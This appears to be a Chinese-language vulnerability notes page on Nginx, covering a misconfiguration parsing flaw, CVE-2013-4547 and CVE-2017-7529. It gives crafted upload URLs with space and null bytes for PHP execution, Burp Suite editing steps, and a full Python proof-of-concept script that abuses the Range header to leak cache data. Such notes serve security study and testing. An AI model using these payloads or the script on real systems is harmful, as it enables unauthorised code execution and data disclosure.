---
title: Nginx
---

## 应用简介
Nginx 是一个高性能的HTTP和反向代理web服务器
## [配置错误]-解析漏洞

**漏洞概述**

该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞

**漏洞利用**

增加`/.php`后缀，被解析成PHP文件

```
http://your-ip/uploadfiles/123.png/.php
```

配置错误引起的漏洞还有CRLF注入、目录穿越、add_header被覆盖绕过CSP

## [CVE-2013-4547]-文件名逻辑漏洞（RCE）

**漏洞概述**

```http
#影响版本
0.8.41 ~ 1.4.3
1.5.0 ~ `1.5.7`
```

因nginx错误地解析了请求的URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响

我们可以请求如下URI：`/test[0x20]/../admin/index.php`，这个URI不会匹配上location后面的/admin/，也就绕过了其中的IP验证；但最后请求的是`/test[0x20]/../admin/index.php`文件，也就是/admin/index.php，成功访问到后台。（这个前提是需要有一个目录叫test：这是Linux系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制）

**漏洞利用**

1、上传一个`1.gif` ，注意后面添加一个空格

访问`http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php`

即可发现PHP已被解析

2、上传一个图片test2.jpg空格，注意后面添加一个空格

上传的文件找不到，因为浏览器自动将空格编码为%20，服务器中找不到名为test2.jpg%20的文件
接下来，我们想要上传的jpg文件作为php解析，就需要利用未编码的空格和截止符（\0）进行构造

```
http://ip:8080/uploadfiles/test2.jpgAAAphp
```

使用burpsuite将AAA分别更改为20（空格）、00（截止符\0）和2e(分隔符号.)

这样我们发送的请求就变为：

```
http://you-ip:8080/uploadfiles/test2.jpg[0x20][0x00].php
```

## [CVE-2017-7529]-越界读取缓存漏洞

**漏洞概述**

Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。

缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。

如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。

如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。

而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。

如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。

**漏洞利用**

可以使用该`POC`进行如下测试：`python3 poc.py [url]`

如果使用该POC读取的内容有误，请调整poc.py中的偏移地址（605）

```python
#!/usr/bin/env python
import sys
import requests

if len(sys.argv) < 2:
    print("%s url" % (sys.argv[0]))
    print("eg: python %s http://your-ip:8080/" % (sys.argv[0]))
    sys.exit()

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
}
offset = 605
url = sys.argv[1]

file_len = len(requests.get(url, headers=headers).content)
n = file_len + offset
headers['Range'] = "bytes=-%d,-%d" % (
    n, 0x8000000000000000 - n)

r = requests.get(url, headers=headers)
print(r.text)
```